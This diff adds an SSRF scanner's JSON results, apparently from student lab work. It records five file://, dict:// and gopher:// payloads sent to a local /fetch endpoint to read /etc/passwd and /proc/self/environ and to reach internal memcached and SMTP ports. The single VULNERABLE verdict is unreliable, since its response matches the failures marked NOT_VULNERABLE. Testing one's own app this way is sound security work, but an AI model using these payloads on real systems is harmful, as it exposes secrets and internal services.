@@ -1,0 +1,59 @@
+{
+  "roll_number": "727823TUCY014",
+  "scan_time": "2026-03-29 15:04:43",
+  "total_payloads": 5,
+  "vulnerable": 1,
+  "possible": 0,
+  "results": [
+    {
+      "category": "protocol_abuse",
+      "payload": "file:///etc/passwd",
+      "injected_url": "http://127.0.0.1:5000/fetch?url=file:///etc/passwd",
+      "status_code": 500,
+      "verdict": "VULNERABLE",
+      "elapsed_ms": 6.22,
+      "response_snippet": "No connection adapters were found for 'file:///etc/passwd'",
+      "timestamp": "2026-03-29T15:04:43.525270"
+    },
+    {
+      "category": "protocol_abuse",
+      "payload": "file:///etc/hosts",
+      "injected_url": "http://127.0.0.1:5000/fetch?url=file:///etc/hosts",
+      "status_code": 500,
+      "verdict": "NOT_VULNERABLE",
+      "elapsed_ms": 1.99,
+      "response_snippet": "No connection adapters were found for 'file:///etc/hosts'",
+      "timestamp": "2026-03-29T15:04:43.528218"
+    },
+    {
+      "category": "protocol_abuse",
+      "payload": "file:///proc/self/environ",
+      "injected_url": "http://127.0.0.1:5000/fetch?url=file:///proc/self/environ",
+      "status_code": 500,
+      "verdict": "NOT_VULNERABLE",
+      "elapsed_ms": 1.58,
+      "response_snippet": "No connection adapters were found for 'file:///proc/self/environ'",
+      "timestamp": "2026-03-29T15:04:43.530401"
+    },
+    {
+      "category": "protocol_abuse",
+      "payload": "dict://localhost:11211/stats",
+      "injected_url": "http://127.0.0.1:5000/fetch?url=dict://localhost:11211/stats",
+      "status_code": 500,
+      "verdict": "NOT_VULNERABLE",
+      "elapsed_ms": 1.41,
+      "response_snippet": "No connection adapters were found for 'dict://localhost:11211/stats'",
+      "timestamp": "2026-03-29T15:04:43.532498"
+    },
+    {
+      "category": "protocol_abuse",
+      "payload": "gopher://localhost:25/_HELO%20localhost",
+      "injected_url": "http://127.0.0.1:5000/fetch?url=gopher://localhost:25/_HELO%2520localhost",
+      "status_code": 500,
+      "verdict": "NOT_VULNERABLE",
+      "elapsed_ms": 1.45,
+      "response_snippet": "No connection adapters were found for 'gopher://localhost:25/_HELO%20localhost'",
+      "timestamp": "2026-03-29T15:04:43.534778"
+    }
+  ]
+}
